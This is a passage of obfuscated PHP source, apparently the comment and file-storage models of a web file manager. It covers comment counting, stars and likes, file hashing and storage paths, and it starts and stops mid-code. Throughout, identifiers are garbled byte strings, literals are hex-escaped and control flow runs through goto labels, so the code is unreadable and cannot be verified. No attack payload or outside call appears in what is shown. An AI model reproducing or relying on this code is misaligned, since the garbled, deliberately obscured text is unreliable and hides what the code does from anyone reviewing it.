$this->alias($›†óã¯ş[528])->field($Ã²€Åˆ)->where($Û†ÊÒ±†)->join($ó¡¯şù‹)->select(); $this->_listAppendAuth($¼—•âĞã); $this->_listAppendUser($¼—•âĞã); $this->_listAppendPath($¼—•âĞã); $¼—•âĞã = array_to_keyvalue($¼—•âĞã, $›†óã¯ş[193]); $ê™¦Ä‚ = "\57{$£–òÕÀˆ[$›†óã¯ş[32]]}\57"; $ê™¦Ä‚ = $ê™¦Ä‚ == $›†óã¯ş[601] ? $›†óã¯ş[8] : $ê™¦Ä‚; $œûÀÃî‘ = array(); foreach ($¼—•âĞã as $¿À—äœÎ => $øÏêìæ) { $àóšğã™ = $this->parentLevelArray($øÏêìæ[$›†óã¯ş[593]]); array_shift($àóšğã™); $çøÒ»ÖŒ = $ê™¦Ä‚; for ($«²öÍ¾ = 0; $«²öÍ¾ < count($àóšğã™); $«²öÍ¾++) { $çøÒ»ÖŒ .= $¼—•âĞã[$àóšğã™[$«²öÍ¾]][$›†óã¯ş[32]] . $›†óã¯ş[8]; } $çøÒ»ÖŒ .= $øÏêìæ[$›†óã¯ş[32]]; if ($øÏêìæ[$›†óã¯ş[494]]) { $çøÒ»ÖŒ .= $›†óã¯ş[8]; } $¿î±†ƒ = array($›†óã¯ş[504] => str_replace($›†óã¯ş[601], $›†óã¯ş[8], str_replace($›†óã¯ş[601], $›†óã¯ş[8], str_replace($›†óã¯ş[601], $›†óã¯ş[8], $çøÒ»ÖŒ))), $›†óã¯ş[625] => intval($øÏêìæ[$›†óã¯ş[494]]), $›†óã¯ş[626] => intval($øÏêìæ[$›†óã¯ş[79]]), $›†óã¯ş[88] => intval($øÏêìæ[$›†óã¯ş[88]]), $›†óã¯ş[90] => $this->pathInfoFilter($øÏêìæ)); if (!$¿î±†ƒ[$›†óã¯ş[494]]) { $¿î±†ƒ[$›†óã¯ş[550]] = $øÏêìæ[$›†óã¯ş[550]]; } $œûÀÃî‘[] = $¿î±†ƒ; } $œûÀÃî‘ = array_sort_by($œûÀÃî‘, $›†óã¯ş[87]); return $œûÀÃî‘; } } goto d¦°ö½¦õ; d—ËÖŠËÖâ: class CommentModel extends ModelBase { protected $tableName = "\143\157\155\x6d\x65\156\x74"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\x61\155\x65" => "\143\x6f\155\155\145\x6e\164\x5f\x6d\145\164\x61", "\x6d\x65\x74\141\106\151\x65\x6c\x64" => "\x63\x6f\x6d\x6d\x65\156\x74\x49\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($à€±öà®) { $Š¶İÏˆä =& $_SERVER[£ğ°ÖØø]; if ($à€±öà®[$Š¶İÏˆä[1983]]) { $ó°°Ü‹¿ = $this->where(array($Š¶İÏˆä[1984] => $à€±öà®[$Š¶İÏˆä[1983]]))->find(); if (!$ó°°Ü‹¿ || $ó°°Ü‹¿[$Š¶İÏˆä[190]] != $à€±öà®[$Š¶İÏˆä[190]] || $ó°°Ü‹¿[$Š¶İÏˆä[578]] != $à€±öà®[$Š¶İÏˆä[578]]) { return !1; } $this->where(array($Š¶İÏˆä[1984] => $à€±öà®[$Š¶İÏˆä[1983]]))->setAdd($Š¶İÏˆä[1985], 1); } $à€±öà®[$Š¶İÏˆä[1986]] = 0; $à€±öà®[$Š¶İÏˆä[1985]] = 0; $à€±öà®[$Š¶İÏˆä[814]] = 1; return $this->add($à€±öà®); } public function commentCount($ºÏ³‚º, $É¥Ãï²š, $ƒÊŠ§á = false) { $’¾ŠĞ¹„ =& $_SERVER[£ğ°ÖØø]; if (!$ºÏ³‚º) { return array(); } if (is_string($ºÏ³‚º) || is_int($ºÏ³‚º)) { $ºÏ³‚º = array($ºÏ³‚º); } $°×Ô“Ñ» = array($’¾ŠĞ¹„[578], $’¾ŠĞ¹„[1987] => $’¾ŠĞ¹„[574]); $İ¿õ¡Éõ = array($’¾ŠĞ¹„[578] => array($’¾ŠĞ¹„[7], $ºÏ³‚º), $’¾ŠĞ¹„[190] => $É¥Ãï²š); if ($ƒÊŠ§á) { $İ¿õ¡Éõ[$’¾ŠĞ¹„[1755]] = $ƒÊŠ§á; } $¨íÌÄ­ı = $this->field($°×Ô“Ñ»)->where($İ¿õ¡Éõ)->group($’¾ŠĞ¹„[578])->select(); return array_to_keyvalue($¨íÌÄ­ı, $’¾ŠĞ¹„[578], $’¾ŠĞ¹„[574]); } public function starTarget($Ğ‹Æ½Õ¢, $ê‡µñ¬Î) { $áöâù‚è =& $_SERVER[£ğ°ÖØø]; $ğ©í¯Î = $Ğ‹Æ½Õ¢ + self::TYPE_STAR_OFFSET; $¼äÉ’Ö‰ = array($áöâù‚è[1755] => USER_ID, $áöâù‚è[190] => $ğ©í¯Î, $áöâù‚è[578] => $ê‡µñ¬Î); $ç©Ü€©“ = $this->where($¼äÉ’Ö‰)->find(); if ($ç©Ü€©“) { return $this->where(array($áöâù‚è[484] => $ç©Ü€©“[$áöâù‚è[484]]))->delete(); } $‘˜ÛÄÜÃ = array($áöâù‚è[1983] => 0, $áöâù‚è[1755] => USER_ID, $áöâù‚è[814] => 1, $áöâù‚è[171] => $áöâù‚è[12], $áöâù‚è[190] => $ğ©í¯Î, $áöâù‚è[578] => $ê‡µñ¬Î, $áöâù‚è[1986] => 0, $áöâù‚è[1985] => 0); return $this->add($‘˜ÛÄÜÃ); } public function starTargetCount($ÌëÍıêî, $Øúó¢£Õ) { $ëí€³ß¬ =& $_SERVER[£ğ°ÖØø]; $ÆÌ¦üôğ = $Øúó¢£Õ + self::TYPE_STAR_OFFSET; $½ªéğ÷² = $this->commentCount($ÌëÍıêî, $ÆÌ¦üôğ); $¯À®—Ä = $this->commentCount($ÌëÍıêî, $ÆÌ¦üôğ, USER_ID); return array($ëí€³ß¬[1988] => $½ªéğ÷², $ëí€³ß¬[1989] => $¯À®—Ä); } public function starTargetUserList($æôÆÅÍ, $ŸÕˆ) { $˜ ›Ç®„ =& $_SERVER[£ğ°ÖØø]; $ãöªç× = $æôÆÅÍ + self::TYPE_STAR_OFFSET; $óüÊåÇ = array($˜ ›Ç®„[578] => $ŸÕˆ, $˜ ›Ç®„[190] => $ãöªç×); $Ì€¤¬¸® = $this->where($óüÊåÇ)->count(); $Æ¯ˆ´ğ¿ = array($˜ ›Ç®„[332] => $Ì€¤¬¸®, $˜ ›Ç®„[1990] => array()); if (!$Ì€¤¬¸®) { return $Æ¯ˆ´ğ¿; } $•¶¦Ş€Ì = $this->field($˜ ›Ç®„[1755])->where($óüÊåÇ)->limit(500)->select(); $•¶¦Ş€Ì = array_to_keyvalue($•¶¦Ş€Ì, $˜ ›Ç®„[12], $˜ ›Ç®„[1755]); $Æ¯ˆ´ğ¿[$˜ ›Ç®„[1990]] = Model($˜ ›Ç®„[586])->userListInfo($•¶¦Ş€Ì); return $Æ¯ˆ´ğ¿; } public function prasiseUserList($‰œÕ—†˜) { $Š»«Çİ’ =& $_SERVER[£ğ°ÖØø]; $ĞÎÔğœ = array($Š»«Çİ’[1991] => $‰œÕ—†˜); $Ò·èÆõ© = $this->where($ĞÎÔğœ)->find(); $ç—âÇÅ² = _get($Ò·èÆõ©, $Š»«Çİ’[1986], 0); $¶¥ˆë„Ú = array($Š»«Çİ’[332] => $ç—âÇÅ², $Š»«Çİ’[1990] => array()); if (!$ç—âÇÅ²) { return $¶¥ˆë„Ú; } $õ°óÇß™ = Model($Š»«Çİ’[1992])->field($Š»«Çİ’[1755])->where($ĞÎÔğœ)->limit(500)->select(); $õ°óÇß™ = array_to_keyvalue($õ°óÇß™, $Š»«Çİ’[12], $Š»«Çİ’[1755]); $¶¥ˆë„Ú[$Š»«Çİ’[1990]] = Model($Š»«Çİ’[586])->userListInfo($õ°óÇß™); return $¶¥ˆë„Ú; } public function remove($¾ªê€Äø) { $½ûïÃˆï =& $_SERVER[£ğ°ÖØø]; $©„¡õ¼  = array($½ûïÃˆï[1984] => $¾ªê€Äø); $°½æ«˜Ä = $this->where($©„¡õ¼ )->find(); if ($°½æ«˜Ä[$½ûïÃˆï[1983]]) { $this->where(array($½ûïÃˆï[1984] => $°½æ«˜Ä[$½ûïÃˆï[1983]]))->setAdd($½ûïÃˆï[1985], -1); } return $this->where($©„¡õ¼ )->delete(); } public function edit($Å’“Å¬”, $ÖõØåö) { $À·”ˆ¢¢ =& $_SERVER[£ğ°ÖØø]; $‚—³†Ù = array($À·”ˆ¢¢[1984] => $Å’“Å¬”); return $this->where($‚—³†Ù)->save(array($À·”ˆ¢¢[1993] => $ÖõØåö)); } public function prasise($ÙÌöÂ­Ù) { $‡´ºÜñ· =& $_SERVER[£ğ°ÖØø]; $×¬âíú = Model($‡´ºÜñ·[1994]); $•ƒØ¤¼‹ = array($‡´ºÜñ·[1984] => $ÙÌöÂ­Ù, $‡´ºÜñ·[1746] => USER_ID); $úÈ¨Ü¨é = $×¬âíú->where($•ƒØ¤¼‹)->find(); if (!$úÈ¨Ü¨é) { $×¬âíú->add($•ƒØ¤¼‹); $šÌ = $this->where(array($‡´ºÜñ·[1984] => $ÙÌöÂ­Ù))->setAdd($‡´ºÜñ·[1986], 1); } else { $×¬âíú->where($•ƒØ¤¼‹)->delete(); $šÌ = $this->where(array($‡´ºÜñ·[1984] => $ÙÌöÂ­Ù))->setAdd($‡´ºÜñ·[1986], -1); } return $šÌ; } public function targetInfo($÷Í©ºñ», $­ô÷êˆı) { $³—¸ï =& $_SERVER[£ğ°ÖØø]; $”æ™¦×ş = array($³—¸ï[657] => $÷Í©ºñ», $³—¸ï[658] => $­ô÷êˆı); $Îı®óÕÈ = $this->where($”æ™¦×ş)->count(); $¾§İùñ = "\122\111\107\x48\x54\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\143\x6f\x6d\155\145\156\x74\137\x70\162\x61\151\x73\x65\x20\x73\x74\x61\x72\40\x6f\x6e\x20\143\x6f\155\x6d\145\x6e\164\x2e\x63\157\155\155\145\x6e\x74\x49\x44\40\75\x20\x73\x74\x61\162\x2e\143\157\155\x6d\x65\156\x74\x49\x44"; $œ÷·€“µ = $this->alias($³—¸ï[430])->where($”æ™¦×ş)->join($¾§İùñ, $³—¸ï[1995])->count(); $­¯¤ĞÑÉ = array($³—¸ï[1996] => $Îı®óÕÈ, $³—¸ï[1997] => $œ÷·€“µ); return $­¯¤ĞÑÉ; } public function listData($¦Æ•ÔÅç) { $Êú¤’µË =& $_SERVER[£ğ°ÖØø]; if (isset($¦Æ•ÔÅç[$Êú¤’µË[1998]])) { if ($¦Æ•ÔÅç[$Êú¤’µË[1998]]) { $¦Æ•ÔÅç[$Êú¤’µË[1991]] = array($Êú¤’µË[1075], intval($¦Æ•ÔÅç[$Êú¤’µË[1998]])); } unset($¦Æ•ÔÅç[$Êú¤’µË[1998]]); } if (isset($¦Æ•ÔÅç[$Êú¤’µË[1999]])) { if ($¦Æ•ÔÅç[$Êú¤’µË[1999]]) { $¦Æ•ÔÅç[$Êú¤’µË[1991]] = array($Êú¤’µË[1072], intval($¦Æ•ÔÅç[$Êú¤’µË[1999]])); } unset($¦Æ•ÔÅç[$Êú¤’µË[1999]]); } return $this->_listData($¦Æ•ÔÅç); } private function _listData($ÂÚ£‘Ùé) { $ÆŸÚÇ® =& $_SERVER[£ğ°ÖØø]; $Ç¼Í©¹ = $this->where($ÂÚ£‘Ùé)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ç¼Í©¹[$ÆŸÚÇ®[454]]); $this->_listAppendUser($Ç¼Í©¹[$ÆŸÚÇ®[454]]); $this->_listAppendMeta($Ç¼Í©¹[$ÆŸÚÇ®[454]]); return $Ç¼Í©¹; } private function _makeOrder() { $›´çúÊ =& $_SERVER[£ğ°ÖØø]; $ô½½§ò = array($›´çúÊ[1986], $›´çúÊ[1985], $›´çúÊ[231]); $à¼ïèè = Input::get($›´çúÊ[539], $›´çúÊ[7], $›´çúÊ[506], $ô½½§ò); $›œÛ¶° = Input::get($›´çúÊ[540], $›´çúÊ[7], $›´çúÊ[1748], array($›´çúÊ[2000], $›´çúÊ[535])); $ÎæÂ¡âœ = $à¼ïèè . $›´çúÊ[53] . $›œÛ¶°; return $this->order($ÎæÂ¡âœ); } private function _listAppendParent(&$œÍÄ¦ä›) { $»€¶×çß =& $_SERVER[£ğ°ÖØø]; $Ó³íİ¿Ì = array_unique(array_to_keyvalue($œÍÄ¦ä›, $»€¶×çß[12], $»€¶×çß[1983])); $Ó³íİ¿Ì = array_remove_value($Ó³íİ¿Ì, $»€¶×çß[228]); if (!$Ó³íİ¿Ì) { return; } $­Œ¤ê¶Ë = $this->where(array($»€¶×çß[1984] => array($»€¶×çß[7], $Ó³íİ¿Ì)))->select(); $­Œ¤ê¶Ë = array_to_keyvalue($­Œ¤ê¶Ë, $»€¶×çß[1991]); foreach ($œÍÄ¦ä› as &$Ğşâ”ÌÔ) { if (isset($­Œ¤ê¶Ë[$Ğşâ”ÌÔ[$»€¶×çß[1983]]])) { $Ğşâ”ÌÔ[$»€¶×çß[2001]] = $­Œ¤ê¶Ë[$Ğşâ”ÌÔ[$»€¶×çß[1983]]]; } } unset($Ğşâ”ÌÔ); } private function _listAppendUser(&$ª¥˜Áñ÷) { $‘ÒøÅ =& $_SERVER[£ğ°ÖØø]; $ä¶ŞÍ  = array_unique(array_to_keyvalue($ª¥˜Áñ÷, $‘ÒøÅ[12], $‘ÒøÅ[1755])); $ä¶ŞÍ  = array_remove_value($ä¶ŞÍ , $‘ÒøÅ[228]); if (count($ä¶ŞÍ ) == 0) { return; } foreach ($ª¥˜Áñ÷ as $Í¼ûˆê‘) { if (isset($Í¼ûˆê‘[$‘ÒøÅ[2001]])) { $ä¶ŞÍ [] = $Í¼ûˆê‘[$‘ÒøÅ[2001]][$‘ÒøÅ[1755]]; } } $‡’Öí­Ç = Model($‘ÒøÅ[607])->userListInfo($ä¶ŞÍ ); foreach ($ª¥˜Áñ÷ as &$Í¼ûˆê‘) { $Í¼ûˆê‘[$‘ÒøÅ[671]] = $‡’Öí­Ç[$Í¼ûˆê‘[$‘ÒøÅ[1755]]]; if (isset($Í¼ûˆê‘[$‘ÒøÅ[2001]])) { $Í¼ûˆê‘[$‘ÒøÅ[2001]][$‘ÒøÅ[671]] = $‡’Öí­Ç[$Í¼ûˆê‘[$‘ÒøÅ[2001]][$‘ÒøÅ[1755]]]; } } unset($Í¼ûˆê‘); } private function _listAppendMeta(&$È£°Ø‚) { $ªß’Á¥ö =& $_SERVER[£ğ°ÖØø]; $ ıô«Û‰ = array_unique(array_to_keyvalue($È£°Ø‚, $ªß’Á¥ö[12], $ªß’Á¥ö[1991])); $ ıô«Û‰ = array_remove_value($ ıô«Û‰, $ªß’Á¥ö[228]); if (!$ ıô«Û‰) { return; } foreach ($È£°Ø‚ as $»Ÿ¢‰‹Ì) { if (isset($»Ÿ¢‰‹Ì[$ªß’Á¥ö[2001]])) { $ ıô«Û‰[] = $»Ÿ¢‰‹Ì[$ªß’Á¥ö[2001]][$ªß’Á¥ö[1991]]; } } $Ï­Ì»º = $this->metaList($ ıô«Û‰); if (!$Ï­Ì»º) { return !1; } foreach ($È£°Ø‚ as &$»Ÿ¢‰‹Ì) { $»Ÿ¢‰‹Ì[$ªß’Á¥ö[548]] = $Ï­Ì»º[$»Ÿ¢‰‹Ì[$ªß’Á¥ö[1991]]]; if (isset($»Ÿ¢‰‹Ì[$ªß’Á¥ö[2001]])) { $»Ÿ¢‰‹Ì[$ªß’Á¥ö[2001]][$ªß’Á¥ö[548]] = $Ï­Ì»º[$»Ÿ¢‰‹Ì[$ªß’Á¥ö[2001]][$ªß’Á¥ö[1991]]]; } } unset($»Ÿ¢‰‹Ì); } private function metaList($¹Ğî´Ç­) { $¤»Ç›¿Ì =& $_SERVER[£ğ°ÖØø]; if (!$¹Ğî´Ç­) { return array(); } $¿ãßÄÈˆ = array($¤»Ç›¿Ì[1991] => array($¤»Ç›¿Ì[7], $¹Ğî´Ç­)); $á¯®ÙËÕ = Model($¤»Ç›¿Ì[2002])->where($¿ãßÄÈˆ)->select(); $á¯®ÙËÕ = array_to_keyvalue_group($á¯®ÙËÕ, $¤»Ç›¿Ì[1991]); foreach ($á¯®ÙËÕ as $”Îã„ì => $ğôû•Ïƒ) { $¾¦êåì… = array(); foreach ($ğôû•Ïƒ as $Õ…ò‰²–) { $¾¦êåì…[$Õ…ò‰²–[$¤»Ç›¿Ì[97]]] = $Õ…ò‰²–[$¤»Ç›¿Ì[459]]; } $á¯®ÙËÕ[$”Îã„ì] = $¾¦êåì…; } return $á¯®ÙËÕ ? $á¯®ÙËÕ : array(); } public function removeTarget($üÖ˜ŒëŠ, $²†é‰ùµ) { $©©‡©áù =& $_SERVER[£ğ°ÖØø]; if (!$²†é‰ùµ) { return !0; } $²†é‰ùµ = is_array($²†é‰ùµ) ? $²†é‰ùµ : array($²†é‰ùµ); $Óé²Ğá = array($©©‡©áù[190] => $üÖ˜ŒëŠ, $©©‡©áù[578] => array($©©‡©áù[7], $²†é‰ùµ)); $ï’Ä±ëÜ = $this->field($©©‡©áù[1991])->where($Óé²Ğá)->select(); $é«Ïûİ§ = array_to_keyvalue($ï’Ä±ëÜ, $©©‡©áù[12], $©©‡©áù[1991]); if (!$é«Ïûİ§) { return !0; } $Óé²Ğá = array($©©‡©áù[1991] => array($©©‡©áù[7], $é«Ïûİ§)); $this->where($Óé²Ğá)->delete(); Model($©©‡©áù[1994])->where($Óé²Ğá)->delete(); Model($©©‡©áù[2003])->where($Óé²Ğá)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\151\x6c\145\137\x63\x6f\156\164\x65\x6e\164\163"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\x65\124\151\x6d\x65", "\164\x69\x6d\x65", "\x69\156\163\145\162\x74", "\146\x75\156\143\164\x69\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\x6f\137\x66\x69\154\x65"; protected $tableMeta = array("\x74\141\142\154\x65\116\141\155\145" => "\x69\x6f\x5f\x66\x69\x6c\x65\137\x6d\145\164\141", "\155\x65\164\141\106\x69\x65\154\144" => "\146\151\154\x65\111\x44"); public function fileInfo($âõ€šÁ) { $ã½‡‡úÖ =& $_SERVER[£ğ°ÖØø]; static $­‰¯ø¢¥ = array(); if (!isset($­‰¯ø¢¥[$âõ€šÁ])) { $ñêğ®Ş = $ã½‡‡úÖ[2004]; $¢ìÉ¬À° = Model($ã½‡‡úÖ[553])->field($ñêğ®Ş)->where(array($ã½‡‡úÖ[551] => $âõ€šÁ))->find(); $­‰¯ø¢¥[$âõ€šÁ] = $¢ìÉ¬À°; } return $­‰¯ø¢¥[$âõ€šÁ]; } public function addFileByContent($«â„‹şÍ = '', $šğšÉÙî = '') { $ËúÔõË =& $_SERVER[£ğ°ÖØø]; $×÷Û“ü = TEMP_PATH . $ËúÔõË[2005]; if (!is_dir($×÷Û“ü)) { mk_dir($×÷Û“ü); } $¹ÉøÖâ¹ = $×÷Û“ü . $ËúÔõË[2006] . rand_string(16); file_put_contents($¹ÉøÖâ¹, $«â„‹şÍ); $ÜĞå–ä = $this->addFile($¹ÉøÖâ¹, $šğšÉÙî, !0); if (file_exists($¹ÉøÖâ¹)) { @unlink($¹ÉøÖâ¹); } return $ÜĞå–ä; } public function createFileName($Ü›„ŠÜ¶, $ÚÃ™¨ = false, $ç†Í‹¦ = false) { $ûÏ¾˜¼ç =& $_SERVER[£ğ°ÖØø]; $º²ÛÔíà = IO::init($ûÏ¾˜¼ç[8]); $ˆ½•ª‘ = $this->makeFilePath($Ü›„ŠÜ¶, $º²ÛÔíà, $ÚÃ™¨, $ç†Í‹¦); $šÊİÈçà = $º²ÛÔíà->pathFather($ˆ½•ª‘); static $õÛŠ„½ = false; $ŒàÁ—öª = $ûÏ¾˜¼ç[2007] . md5($šÊİÈçà); if (!$õÛŠ„½ && !Cache::get($ŒàÁ—öª)) { $õÛŠ„½ = !0; $é‰¯Áá = IO::mkdir($šÊİÈçà); if (!IO::exist($é‰¯Áá . $ûÏ¾˜¼ç[861])) { IO::mkfile($é‰¯Áá . $ûÏ¾˜¼ç[861]); } Cache::set($ŒàÁ—öª, 1, 3600 * 2); } return $ˆ½•ª‘; } public function makeFilePath($¶×æØÌŸ, $ò‰’®¡¼, $Çê‡õ„À = false, $ÍöÄÉ® = false) { $óŒìØ” =& $_SERVER[£ğ°ÖØø]; $ĞØ”ø¶Š = Model($óŒìØ”[834])->get($óŒìØ”[2008]); $€œø²«“ = KodIO::defaultIO() . date($óŒìØ”[2009]); $®Òõ´Ú… = $€œø²«“ . rand_string(5) . short_id(100); $¶×æØÌŸ = str_replace($óŒìØ”[8], $óŒìØ”[11], KodIO::clear($¶×æØÌŸ)); $–Ìâœ† = $ò‰’®¡¼->ext($¶×æØÌŸ); if (!$¶×æØÌŸ) { $ĞØ”ø¶Š = $óŒìØ”[840]; } switch ($ĞØ”ø¶Š) { case $óŒìØ”[2010]: if ($–Ìâœ†) { $®Òõ´Ú… = $®Òõ´Ú… . $óŒìØ”[10] . $–Ìâœ†; } if ($–Ìâœ† == $óŒìØ”[1946]) { $®Òõ´Ú… .= $óŒìØ”[1274]; } break; case $óŒìØ”[2011]: $Ö›¥ªú = Model($óŒìØ”[834])->get($óŒìØ”[835]); $ààà’î = substr(md5($óŒìØ”[836] . $Ö›¥ªú . date($óŒìØ”[813])), 0, 8); $˜ËüÎÄÚ = KodIO::defaultDriver(); $€œø²«“ = $óŒìØ”[1305] . $˜ËüÎÄÚ[$óŒìØ”[484]] . $óŒìØ”[493] . date($óŒìØ”[2012]) . $ààà’î . $óŒìØ”[8]; if ($–Ìâœ† == $óŒìØ”[1946]) { $¶×æØÌŸ .= $óŒìØ”[1274]; } $å§ÜŠƒş = $óŒìØ”[2013] . $€œø²«“ . $¶×æØÌŸ; CacheLock::lock($å§ÜŠƒş); $®Òõ´Ú… = $€œø²«“ . $¶×æØÌŸ; if (IO::exist($€œø²«“ . $¶×æØÌŸ)) { $½Õ¼ÛÍò = substr($¶×æØÌŸ, 0, strlen($¶×æØÌŸ) - strlen($–Ìâœ†)); $©­ºİ«Ñ = $ÍöÄÉ® ? substr($ÍöÄÉ®, 0, 5) : ($Çê‡õ„À ? substr($Çê‡õ„À, 0, 5) : rand_string(5)); $®Òõ´Ú… = $€œø²«“ . $½Õ¼ÛÍò . $©­ºİ«Ñ; if ($–Ìâœ†) { $®Òõ´Ú… = $®Òõ´Ú… . $óŒìØ”[10] . $–Ìâœ†; } } if (IO::isOsDriver($®Òõ´Ú…) && !IO::isUploadServer($®Òõ´Ú…)) { if (IO::exist($®Òõ´Ú…)) { return $®Òõ´Ú…; } $—“âå¹Á = IO::setContent($®Òõ´Ú…, $óŒìØ”[12]); if (!$—“âå¹Á) { show_json($óŒìØ”[2014], !1); } } CacheLock::unlock($å§ÜŠƒş); break; case $óŒìØ”[840]: break; default: break; } return $®Òõ´Ú…; } public function addFileByRemote($¶õ©é¥², $˜Ú§ôôÚ, $Ë„ó¬Îß = array()) { $”—Éµ’ =& $_SERVER[£ğ°ÖØø]; if (!IO::exist($¶õ©é¥²)) { return !1; } $¿™Ê±ëó = $Ë„ó¬Îß[$”—Éµ’[556]] ? $Ë„ó¬Îß[$”—Éµ’[556]] : $”—Éµ’[12]; $ —âŞì = IO::hashMd5($¶õ©é¥², $¿™Ê±ëó); $–Æ±ò·Ô = KodIO::defaultDriver(); $¬ÕÓóüŸ = array($”—Éµ’[626] => IO::size($¶õ©é¥²), $”—Éµ’[2015] => 1, $”—Éµ’[503] => $˜Ú§ôôÚ, $”—Éµ’[872] => $–Æ±ò·Ô[$”—Éµ’[484]], $”—Éµ’[504] => $¶õ©é¥², $”—Éµ’[2016] => $Ë„ó¬Îß[$”—Éµ’[681]] ? $Ë„ó¬Îß[$”—Éµ’[681]] : IO::hashSimple($¶õ©é¥²), $”—Éµ’[2017] => $ —âŞì ? $ —âŞì : $¿™Ê±ëó); if ($Üª¤Ø½İ = $this->addFileCheckExist($¬ÕÓóüŸ[$”—Éµ’[681]], $¬ÕÓóüŸ[$”—Éµ’[556]], $¬ÕÓóüŸ[$”—Éµ’[79]])) { return $Üª¤Ø½İ; } return $this->addFileData($¬ÕÓóüŸ); } private function addFileData($Íº±ÊñĞ) { $Íµ¾»Ü =& $_SERVER[£ğ°ÖØø]; if (!$Íº±ÊñĞ) { return !1; } $Íº±ÊñĞ[$Íµ¾»Ü[79]] = intval($Íº±ÊñĞ[$Íµ¾»Ü[79]]); if (!$Íº±ÊñĞ[$Íµ¾»Ü[79]] && strlen($Íº±ÊñĞ[$Íµ¾»Ü[681]]) > 32) { $Íº±ÊñĞ[$Íµ¾»Ü[79]] = intval(substr($Íº±ÊñĞ[$Íµ¾»Ü[681]], 32)); } $ƒã¤¹µ’ = $this->add($Íº±ÊñĞ); return $this->find($ƒã¤¹µ’); } public function addFile($§¤ç‘˜, $Í´‹óèø, $‚°˜á¶Ç = false) { $‹íÁŞ¨¥ =& $_SERVER[£ğ°ÖØø]; $€¡“šÚ = IO::hashSimple($§¤ç‘˜); $ßé¬ƒ¬¢ = IO::size($§¤ç‘˜); $îÄ…·Œ = $ßé¬ƒ¬¢ <= 1024 * 1024 * 10 ? IO::hashMd5($§¤ç‘˜) : $‹íÁŞ¨¥[12]; $ıÊì¾ôˆ = $‹íÁŞ¨¥[2018] . $€¡“šÚ; CacheLock::lock($ıÊì¾ôˆ); if ($îÄ…·Œ && $€¡“šÚ) { $ˆÑÅüç¯ = $this->addFileCheckExist($€¡“šÚ, $îÄ…·Œ, $ßé¬ƒ¬¢); if ($ˆÑÅüç¯) { CacheLock::unlock($ıÊì¾ôˆ); return $ˆÑÅüç¯; } } $Öıœ³»à = $this->addFileMake($§¤ç‘˜, $ßé¬ƒ¬¢, $€¡“šÚ, $îÄ…·Œ, $Í´‹óèø, $‚°˜á¶Ç); $üÌ›–·á = $this->addFileData($Öıœ³»à); CacheLock::unlock($ıÊì¾ôˆ); if (!$îÄ…·Œ && $üÌ›–·á) { $this->fileMd5Check($üÌ›–·á); } return $üÌ›–·á; } public function fileMd5Check($ÄæŒÒ¿) { $’éß£—è =& $_SERVER[£ğ°ÖØø]; $ß³´Í”‘ = array($ÄæŒÒ¿[$’éß£—è[550]], $ÄæŒÒ¿[$’éß£—è[87]]); $Ü™â‹É“ = $’éß£—è[2019] . $ÄæŒÒ¿[$’éß£—è[87]]; $…°Ìº¢ã = $’éß£—è[2020] . $ÄæŒÒ¿[$’éß£—è[550]]; TaskQueue::add($’éß£—è[2021], $ß³´Í”‘, $Ü™â‹É“, $…°Ìº¢ã); } public function fileMd5Set($Óï¶şöŞ, $ŞÍ²ğ´õ) { $»×˜Åô’ =& $_SERVER[£ğ°ÖØø]; $Èû¹†ç  = $this->find($Óï¶şöŞ); if (!$Èû¹†ç  || $Èû¹†ç [$»×˜Åô’[556]]) { return; } $ßâ¬±œ” = IO::hashMd5($ŞÍ²ğ´õ); if (!$ßâ¬±œ”) { return $»×˜Åô’[12]; } $this->where(array($»×˜Åô’[550] => $Óï¶şöŞ))->save(array($»×˜Åô’[556] => $ßâ¬±œ”)); } public function addFileMake($å»ÁóŠª, $ğÑİøÎ, $Õ¢âÔ§Š, $‘Ğ¬ƒùÜ, $¾Ù ¿Ö, $¾ğŸÒ·¹) { $•ÜÁı°´ =& $_SERVER[£ğ°ÖØø]; $îÏˆ½ì± = $this->createFileName($¾Ù ¿Ö, $Õ¢âÔ§Š, $‘Ğ¬ƒùÜ); $îàôè† = get_path_father($îÏˆ½ì±); $­‚àãƒ½ = get_path_this($îÏˆ½ì±); if ($¾ğŸÒ·¹) { $ÚØ‚² = IO::move($å»ÁóŠª, $îàôè†, !1, $­‚àãƒ½); } else { $ÚØ‚² = IO::copy($å»ÁóŠª, $îàôè†, !1, $­‚àãƒ½); } if (!$ÚØ‚²) { return !1; } $üõá¶ñş = KodIO::defaultDriver(); $ëØ²Şñ‰ = array($•ÜÁı°´[626] => $ğÑİøÎ, $•ÜÁı°´[2015] => 1, $•ÜÁı°´[503] => $¾Ù ¿Ö, $•ÜÁı°´[872] => $üõá¶ñş[$•ÜÁı°´[484]], $•ÜÁı°´[504] => $îÏˆ½ì±, $•ÜÁı°´[2016] => $Õ¢âÔ§Š, $•ÜÁı°´[2017] => $‘Ğ¬ƒùÜ); return $ëØ²Şñ‰; } public function addFileCheckExist($ïĞ¬øäØ, $ñ‘ÆïÚ¿, $›üÛê•¸) { $™Øêğù´ =& $_SERVER[£ğ°ÖØø]; $æ˜êö­É = $this->findByHash($ïĞ¬øäØ, $ñ‘ÆïÚ¿); if (!$æ˜êö­É) { return !1; } $©¸‹½é = array($™Øêğù´[2015] => intval($æ˜êö­É[$™Øêğù´[2022]]) + 1, $™Øêğù´[626] => $›üÛê•¸); $this->where(array($™Øêğù´[551] => $æ˜êö­É[$™Øêğù´[550]]))->save($©¸‹½é); return $æ˜êö­É; } public function remove($­ÚÀ²â‚) { $this->linkCountChange($­ÚÀ²â‚, !1); $this->clearEmpty(); return !0; } public function linkAdd($ºÆ­‰Öñ) { $this->linkCountChange($ºÆ­‰Öñ, !0); } public function linkCountChange($áõ‡¶, $¯¨µëå‘) { $è·éòÚ =& $_SERVER[£ğ°ÖØø]; if (!$áõ‡¶) { return; } if (!is_array($áõ‡¶)) { $áõ‡¶ = array($áõ‡¶); } $öÖ°Ø¾ = array(); foreach ($áõ‡¶ as $ËÎ½ğ§) { $ï»òËÌÂ = 